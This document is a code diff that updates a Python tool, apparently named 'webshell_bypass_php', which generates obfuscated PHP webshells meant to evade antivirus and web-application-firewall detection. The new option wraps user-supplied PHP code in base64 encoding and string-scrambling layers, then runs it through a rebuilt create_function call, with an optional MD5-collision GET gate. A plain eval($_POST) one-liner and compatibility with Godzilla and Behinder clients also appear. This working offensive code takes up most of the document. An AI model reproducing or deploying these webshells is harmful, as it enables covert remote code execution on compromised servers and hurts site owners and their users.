@@ -13,8 +13,7 @@ import hashlib
 免杀原理
 base64 编码，把关键字符base后，打乱，并添加其他字符
 '''
-init() # 颜色输出
-
+init()  # 颜色输出
 
 try:
     def character_encode(str_string, lengths, longchar_characters=""):
@@ -29,6 +28,7 @@ try:
             encoding_string += str_string[:rand_len] + longchar_characters
             str_string = str_string[rand_len:]
         return encoding_string, longchar_characters
+
 
     def shuj(vlaue_mauis):
         data = "".join(random.sample(string.ascii_letters, int(vlaue_mauis)))
@@ -122,6 +122,8 @@ try:
             return php_aes_with_magic(lj_datas=lj_data, php_names=php_name, vlaue_mauis=vlaue_mauis)
         elif jiami == 'f' or jiami == 'F':
             return php_default_xor_base64(lj_datas=lj_data, php_names=php_name, vlaue_mauis=vlaue_mauis)
+        elif jiami == 'g' or jiami == 'G':
+            return php_shuru(lj_datas=lj_data, php_names=php_name, vlaue_mauis=vlaue_mauis)
 
 
     def variable(vlaue_mauis):
@@ -163,7 +165,7 @@ try:
 
 
     def modo(if_a, webshelldata):
-        if if_a == 'c' or if_a == 'b' or if_a == 'e':
+        if if_a == 'c' or if_a == 'b' or if_a == 'e' or if_a == 'g':
             statement = webshelldata
         elif if_a == 'a' or if_a == 'd' or if_a == 'f':  # 写入伪造文件
             a = input("选择伪装（1，2，3，4，5，6，7，666）默认是666：")
@@ -210,7 +212,7 @@ try:
         return statement
 
 
-    def wj(lj_datas, webshelldata, php_names, get_1, fs, if_a, cookie_name="", passwords="", keys=""):
+    def wj(lj_datas, webshelldata, php_names, fs, if_a, get_1=" ", cookie_name="", passwords="", keys="", daima=""):
         try:
             with open(lj_datas, "w+", encoding='utf-8') as f:  # 写入没有伪造文件
                 statement = modo(if_a=if_a, webshelldata=webshelldata)  # 调用模板
@@ -239,7 +241,7 @@ try:
                 print(colored('发生未知错误', 'red'))
             sys.exit()
         with open('success.txt', 'a+', encoding='utf-8') as c:
-            print('\n-------------------------- ruoji_webshell_bypass ----------------------------------')
+            print(colored(f'\n------------------------------','yellow'),'{'+colored("ruoji_webshell_bypass", "green")+'}'+colored(f'-----------------------------', 'yellow'))
             print('|', colored('path:', 'green'), '     |', colored(lj_datas, 'red'))
             print('-----------------------------------------------------------------------------------')
             print('|', colored('加密方式:', 'green'), ' |', colored(f'{fs}', 'red'))
@@ -250,10 +252,11 @@ try:
             print('-----------------------------------------------------------------------------------')
             print('|', colored('key:', 'green'), '      |', colored(f'{keys}', 'red'))
             print('-----------------------------------------------------------------------------------')
-            print('|', colored('Cookie:', 'green'), '   |', colored(f'{cookie_name}', 'red'))
+            print('|', colored('cookie:', 'green'), '   |', colored(f'{cookie_name}', 'red'))
             print('-----------------------------------------------------------------------------------')
-            print('|', colored('注意:', 'green'), '   |', colored('需要填写Cookie的，C需要大写，才行', 'red'))
-            print('-----------------------------------------------------------------------------------')
+            if daima != "":
+                print('|', colored('自定义webshell:', 'green'), '|', colored(f'{daima}', 'red'))
+                print('-----------------------------------------------------------------------------------')
             c.write('-------------------------- ruoji_webshell_bypass ------------------------------' + '\n')
             times = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
             php_names = php_names.replace('\\', ' ')  # 去掉文件名的\
@@ -265,7 +268,9 @@ try:
             c.write(f'get:{get_1}' + '\n')
             c.write(f'password:{passwords}' + '\n')
             c.write(f'key:{keys}' + '\n')
-            c.write(f'Cookie:{cookie_name}' + '\n\n')
+            c.write(f'cookie:{cookie_name}' + '\n')
+            if daima != "":
+                c.write(f'自定义webshell:{daima}' + '\n')
 
 
     # 普通一句话
@@ -547,6 +552,78 @@ ${variables[5]} = ${variables[7]}.${variables[8]};
         wj(lj_datas=lj_datas, webshelldata=webshelldata, php_names=php_names, get_1=get_1,
            fs='冰蝎4.0.5_php_default_xor_base64', if_a='d')
 
+        # 冰蝎
+
+
+    # 自定义webshell
+    def php_shuru(lj_datas, php_names, vlaue_mauis):
+        variables = variable(vlaue_mauis)
+        decode_string = character_encode("base64_decode", 50)
+        str_string = character_encode("str_replace", 50)
+        fun = character_encode(base64.b64encode("create_function".encode('utf-8')).decode('utf-8'), 50)
+        payload_data = input('输入自定义的webshell代码：\n')
+        if payload_data == '' or payload_data == '\n':
+            print(colored(f'\n------------------------------------------', 'red'), '{',
+                  colored("输入为空，程序终止", "green"),
+                  '}',
+                  colored(f'------------------------------------------', 'red'))
+            sys.exit()
+        payload_data = payload_data.strip('<?php') #不去掉的话，会生成报错
+        payload_data = payload_data.strip('?>')
+        ph_1 = character_encode(base64.b64encode(payload_data.encode('utf-8')).decode('utf-8'), 50)
+        echo_data = '<?php ' + payload_data + ' ?>'
+        bm_data =input('请输是否加入get请求(加入后，可以让webshell更难爆破处出密码) a.是 b.否：')
+        if bm_data == '\n' or bm_data == '':
+            print(colored(f'\n------------------------------------------','yellow'),'{'+colored("输入为空，将不使用get请求加密", "green")+'}'+colored(f'------------------------------------------', 'yellow'))
+            bm_data = 'b'
+        if bm_data == 'a':
+            get_1 = f"?{variables[11]}[]=1&{variables[12]}[]=2"
+            webshelldata = '<?php' + f"""
+${variables[13]}='str_';
+${variables[14]}=${variables[13]}.'replace';
+${variables[0]}=substr(${variables[14]},6);
+${variables[1]}='zxcszxctzxcrzxc_zxcrzxcezxc';
+if ($_GET['{variables[11]}'] !== $_GET['{variables[12]}'] && @md5($_GET['{variables[11]}']) === @md5($_GET['{variables[12]}']))""" + '{' + f"""
+	${variables[3]} = 'str_re';
+	${variables[1]}=substr_replace('zxc',${variables[3]},${variables[1]});
+""" + "}else{ die();}" + f"""
+${variables[3]} = 'str_re';
+${variables[1]}=substr_replace('zxc',${variables[3]},${variables[1]});
+${variables[0]}=${variables[1]}.${variables[0]};
+${variables[2]} = ${variables[0]}("{str_string[1]}", "", "{str_string[0]}");
+${variables[4]} = ${variables[2]}("{decode_string[1]}", "", "{decode_string[0]}");
+${variables[6]} = ${variables[4]}(${variables[2]}("{fun[1]}", "", "{fun[0]}"));
+${variables[7]} = ${variables[4]}(${variables[2]}("{ph_1[1]}", "", "{ph_1[0]}"));
+${variables[5]} = ${variables[7]};
+@${variables[10]} = ${variables[6]}("", ${variables[5]});
+@${variables[10]}();
+?>
+                """
+            wj(lj_datas=lj_datas, webshelldata=webshelldata, php_names=php_names,
+               fs='自定义webshell', if_a='g', daima=echo_data,get_1=get_1)
+        else:
+            pass
+            webshelldata = '<?php' + f"""
+        ${variables[13]}='str_';
+        ${variables[14]}=${variables[13]}.'replace';
+        ${variables[0]}=substr(${variables[14]},6);
+        ${variables[1]}='zxcszxctzxcrzxc_zxcrzxcezxc';
+        ${variables[3]} = 'str_re';
+        ${variables[1]}=substr_replace('zxc',${variables[3]},${variables[1]});
+        ${variables[0]}=${variables[1]}.${variables[0]};
+        ${variables[2]} = ${variables[0]}("{str_string[1]}", "", "{str_string[0]}");
+        ${variables[4]} = ${variables[2]}("{decode_string[1]}", "", "{decode_string[0]}");
+        ${variables[6]} = ${variables[4]}(${variables[2]}("{fun[1]}", "", "{fun[0]}"));
+        ${variables[7]} = ${variables[4]}(${variables[2]}("{ph_1[1]}", "", "{ph_1[0]}"));
+        ${variables[5]} = ${variables[7]};
+        @${variables[10]} = ${variables[6]}("", ${variables[5]});
+        @${variables[10]}();
+        ?>
+            """
+            wj(lj_datas=lj_datas, webshelldata=webshelldata, php_names=php_names,
+               fs='自定义webshell', if_a='g', daima=echo_data)
+
+
     if __name__ == "__main__":
         name = colored('webshell_bypass_php_5.0 by 弱鸡', 'green')
         name = name + "\n\n交流群：655934283\n\n\n\ngithub：https://github.com/ytMuCheng/ruoji"
@@ -575,8 +652,8 @@ ${variables[5]} = ${variables[7]}.${variables[8]};
                 else:
                     xt = 'windows'
                 print(f"""
-                |---------------------------------------
-                |{colored('php_弱鸡_webshelll免杀生成_5.0', 'red')}
+                |{colored(f'----------','yellow')}{'{'+colored("ruoji_bypass_waf", "green")+'}'}{colored(f'-----------','yellow')}
+                |"""+colored('---','red')+'{'+colored('php_弱鸡_webshelll免杀生成_5.1', 'green')+'}'+colored('----','red')+"""
                 |哥斯拉_php的一句话，连接方式有三个，其中两个不支持伪造
                 |PHP_EVAL_XOR_BASE64支持
                 |冰蝎PHP_default_xor_base64和PHP_default_aes支持
@@ -592,7 +669,8 @@ ${variables[5]} = ${variables[7]}.${variables[8]};
                 |        4.2: 绕过d盾牌检测
                 |        4.3: 绕过河马检测，并添加了严格的密码验证
                 |        4.4：修复了代码逻辑问题，并添加了@，防止报错
-                |版本5.0: 添加了哥斯拉和冰蝎的免杀       
+                |版本5.0: 添加了哥斯拉和冰蝎的免杀
+                |版本5.1: 添加了用户输入自定义websshell代码         
                 |---------------------------------------
                 |配置信息
                 |默认生成shell文件路径：{path}
@@ -613,31 +691,33 @@ ${variables[5]} = ${variables[7]}.${variables[8]};
                     else:
                         xt = 'windows'
                     print(f"""
-                |---------------------------------------
-                |{colored('php_弱鸡_webshelll免杀生成_5.0', 'red')}
-                |哥斯拉_php的一句话，连接方式有三个，其中两个不支持伪造
-                |PHP_EVAL_XOR_BASE64支持
-                |冰蝎PHP_default_xor_base64和PHP_default_aes支持
-                |不支持PHP_aes_with_magic
-                |---------------------------------------
-                |by 弱鸡
-                |版本1.0: 加入了显示页面伪装
-                |版本2.0: 加入了自定义文件名以及错误处理
-                |        添加了过某些waf
-                |版本3.0: 对一些敏感函数加密
-                |版本4.0: 修复了使用错误
-                |        4.1: 修改了报错问题
-                |        4.2: 绕过d盾牌检测
-                |        4.3: 绕过河马检测，并添加了严格的密码验证
-                |        4.4：修复了代码逻辑问题，并添加了@，防止报错
-                |版本5.0: 添加了哥斯拉和冰蝎的免杀       
-                |---------------------------------------
-                |配置信息
-                |默认生成shell文件路径：{path}
-                |time：{current_time}
-                |系统：{xt}
-                |-------------------------------------------
-                    """)
+                    |{colored(f'----------', 'yellow')}{'{' + colored("ruoji_bypass_waf", "green") + '}'}{colored(f'-----------', 'yellow')}
+                    |""" + colored('---', 'red') + '{' + colored('php_弱鸡_webshelll免杀生成_5.1',
+                                                                 'green') + '}' + colored('----', 'red') + """
+                    |哥斯拉_php的一句话，连接方式有三个，其中两个不支持伪造
+                    |PHP_EVAL_XOR_BASE64支持
+                    |冰蝎PHP_default_xor_base64和PHP_default_aes支持
+                    |不支持PHP_aes_with_magic
+                    |---------------------------------------
+                    |by 弱鸡
+                    |版本1.0: 加入了显示页面伪装
+                    |版本2.0: 加入了自定义文件名以及错误处理
+                    |        添加了过某些waf
+                    |版本3.0: 对一些敏感函数加密
+                    |版本4.0: 修复了使用错误
+                    |        4.1: 修改了报错问题
+                    |        4.2: 绕过d盾牌检测
+                    |        4.3: 绕过河马检测，并添加了严格的密码验证
+                    |        4.4：修复了代码逻辑问题，并添加了@，防止报错
+                    |版本5.0: 添加了哥斯拉和冰蝎的免杀
+                    |版本5.1: 添加了用户输入自定义websshell代码       
+                    |---------------------------------------
+                    |配置信息
+                    |默认生成shell文件路径：{path}
+                    |time：{current_time}
+                    |系统：{xt}
+                    |-------------------------------------------
+                        """)
                     # {colored('冰蝎4.0.5_php_default_xor_base64', 'red')}
                     print((f"""请选择生成webshell类型的连接方式:
                               (a)正常一句话(哥斯拉eval_xor_base64，蚁剑也可以使用){colored("<?php @eval($_POST['随机生成']);?> ", 'red')}
@@ -646,6 +726,7 @@ ${variables[5]} = ${variables[7]}.${variables[8]};
                               (d)冰蝎4.0.5{colored('PHP_default_aes', 'red')}
                               (e)冰蝎4.0.5{colored('PHP_aes_with_magic', 'red')}
                               (f)冰蝎4.0.5{colored('PHP_default_xor_base64', 'red')}
+                              (g)自定义免杀{colored('自己输入webshell代码', 'red')}
                               """))
                     jiami = input("：")
                 if jiami == 'a' or jiami == 'A':
@@ -660,6 +741,8 @@ ${variables[5]} = ${variables[7]}.${variables[8]};
                     Lj(php_name=php, jiami=jiami)
                 elif jiami == 'f' or jiami == 'F':
                     Lj(php_name=php, jiami=jiami)
+                elif jiami == 'g' or jiami == 'G':
+                    Lj(php_name=php, jiami=jiami)
                 else:
                     print("输入错误，将使用(a)")
                     jiami = 'a'
@@ -672,4 +755,5 @@ ${variables[5]} = ${variables[7]}.${variables[8]};
             os.system(f'python {name} -h')
 
 except KeyboardInterrupt as error:
-    print(colored(f'\n------------------------------------------', 'red'),'{',colored("程序终止", "green"),'}',colored(f'------------------------------------------', 'red'))
+    print(colored(f'\n------------------------------------------', 'red'), '{', colored("程序终止", "green"), '}',
+          colored(f'------------------------------------------', 'red'))
